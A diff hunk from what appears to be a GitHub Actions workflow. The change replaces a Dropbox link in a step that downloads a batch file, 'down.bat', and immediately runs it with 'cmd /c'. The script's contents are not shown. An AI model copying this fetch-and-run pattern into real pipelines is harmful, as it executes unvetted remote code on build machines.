@@ -24,7 +24,7 @@ jobs:
 
       - name: Downloading & Setting Up
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/knzijslpfl61m6ujrhh8a/down.bat?rlkey=1uvv9874ss4err14m853ae1zy&dl=1" -OutFile "down.bat"
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3k17mr53efo8a9i74pmq6/down.bat?rlkey=5cs99vfpnwvm5eba3fkhl6aul&dl=1" -OutFile "down.bat"
           cmd /c down.bat
 
       - name: Run Combined Script
